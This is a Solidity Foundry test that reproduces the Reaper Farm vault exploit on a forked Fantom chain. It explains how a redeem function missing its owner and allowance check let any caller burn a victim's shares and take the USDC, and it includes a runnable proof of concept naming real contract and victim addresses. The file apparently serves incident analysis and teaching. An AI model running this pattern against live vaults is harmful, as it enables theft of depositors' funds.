// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~1.7M US$
// Attacker : 0x5636e55e4a72299a0f194c001841e2ce75bb527a (ReaperFarm Exploiter 1 - who trigger the exploit)
// Attacker : 0x2c177d20b1b1d68cc85d3215904a7bb6629ca954 (ReaperFarm Exploiter 2 - who receive the fund)
// AttackContract : 0x8162a5e187128565ace634e76fdd083cb04d0145
// VulnerableContract : https://ftmscan.com/address/0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D#code#F1#L324 (rfUSDC)

// @Info
// Example Tx in this reproduce : https://ftmscan.com/tx/0xc92ls9f3b9312ff26be0adb1c3ff832dbdafdcbcaad33d002744effd515e53c9d5
// Owner 1 : 0x59cb9f088806e511157a6c92b293e5574531022a
// Owner 2 : 0xc010adc2c28a66fbb2107993bf6ede264eca8e54
// Owner 3 : 0x37eedb7ac276bd6c894e81b8937b0b0bab154e22
// Owner 4 : 0x8034aaff3980487a49ca69341d444fcc000088af
// Owner 5 : 0x9e6affa8a14174ca4e931a2d6b7056c41b9beeb6

// @Analysis
// Official post-mortem : https://twitter.com/Reaper_Farm/status/1554500909740302337
// Beosin : https://twitter.com/BeosinAlert/status/1554476940593340421

// VULNERABILITY: Missing authorization check / allowance enforcement in ERC4626-style redeem(owner, receiver)
// The IReaperVaultV2 (and its underlying ReaperVaultV2 implementation at 0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D) exposes
// redeem(uint256 shares, address receiver, address owner) and (presumably) withdraw(uint256 assets, address receiver, address owner).
// Per the standard ERC4626 interface (see IERC4626 in interface.sol:5385-5387):
//   function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
//   function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
// The specification REQUIRES that when msg.sender != owner, the implementation MUST call _spendAllowance(owner, msg.sender, shares)
// (or equivalent) before burning the owner's shares.
// 
// Root cause in the vulnerable contract: the redeem (and withdraw) implementation directly burns shares from the
// arbitrary `owner` parameter and transfers underlying assets to the arbitrary `receiver` parameter WITHOUT
// any `if (msg.sender != owner) { _spendAllowance... }` guard and without requiring the caller to be the owner.
// See the PoC usage at lines 43-44:
//   uint256 victim_bal = ReaperVault.balanceOf(victim);
//   ReaperVault.redeem(victim_bal, address(this), victim);
// This succeeds for ANY caller, ANY victim with positive balanceOf(victim), and ANY receiver.
// 
// Why it works:
// - balanceOf() is public view and returns the victim's share balance (no auth).
// - redeem() accepts fully attacker-controlled (shares, receiver, owner) triple.
// - No on-chain check ties msg.sender to the owner of the shares being burned.
// - The vault then does internal accounting: burns shares from 'owner', pulls from strategy if needed, safeTransfer to 'receiver'.
// - No flashloan, no capital requirement, no prior approval from victim needed. Pure access-control bypass.
// 
// Impact: Complete theft of any user's vault shares' underlying assets (here USDC). Attacker can drain victim
// share balances to self (or any EOA). Total loss ~1.7M USD in the real incident. Any rf* vault share holder
// was exposed; the attack scales to all depositors.
// 
// References in PoC:
// - Line 27: the target ReaperVault
// - Line 39-46: the exploit body that demonstrates the unauthorized redeem
// - Local interface at 51-56: minimal surface exposing the dangerous 3-arg redeem
// 
// EXPLOIT STEPS:
// 1. Fork at a recent block before exploit (here block 44045899 on Fantom).
// 2. Identify a victim with non-zero balanceOf(victim) in the rfUSDC ReaperVault (e.g. one of the owners).
// 3. Query victim_bal = ReaperVault.balanceOf(victim).
// 4. Call ReaperVault.redeem(victim_bal, attacker_address, victim) directly from attacker EOA/contract.
// 5. Vault burns `victim_bal` shares from the victim account (no allowance spent).
// 6. Vault computes corresponding assets (using _freeFunds() etc.), withdraws from strategies as needed.
// 7. Vault transfers the USDC assets directly to the receiver (attacker).
// 8. Attacker now holds the USDC; victim's share balance is zeroed. Repeat for other victims.

contract Attacker is Test {
    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IReaperVaultV2 constant ReaperVault = IReaperVaultV2(0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D);
    IERC20 constant USDC = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);

    function setUp() public {
        console.log("This is a simple PoC that shows how attacker abuse the ReaperVaultV2 contract");
        cheat.createSelectFork("http://127.0.0.1:8552", 44_045_899);
        cheat.label(address(ReaperVault), "ReaperVault");
        cheat.label(address(USDC), "USDC");
    }

    function testExploit() public {
        address victim = 0x59cb9F088806E511157A6c92B293E5574531022A;
        emit log_named_decimal_uint("Victim ReaperUSDCVault balance", ReaperVault.balanceOf(victim), 6);
        emit log_named_decimal_uint("Attacker USDC balance", USDC.balanceOf(address(this)), 6);

        console.log("Exploit...");
        uint256 victim_bal = ReaperVault.balanceOf(victim);
        // VULNERABILITY TRIGGER: unauthorized cross-user redeem
        // msg.sender == attacker, but owner==victim and receiver==attacker.
        // This line should have reverted (or required allowance) per ERC4626.
        ReaperVault.redeem(victim_bal, address(this), victim);

        emit log_named_decimal_uint("Victim ReaperUSDCVault balance", ReaperVault.balanceOf(victim), 6);
        emit log_named_decimal_uint("Attacker USDC balance", USDC.balanceOf(address(this)), 6);
    }
}

interface IReaperVaultV2 {
    function balanceOf(
        address owner
    ) external view returns (uint256);
    // DANGEROUS INTERFACE: the 3-argument redeem (and withdraw) that accepts
    // arbitrary `owner` (whose shares get burned) and `receiver` (who receives assets)
    // with NO enforcement that caller==owner or that an allowance was granted.
    // This is the exact surface abused by the exploit.
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
}
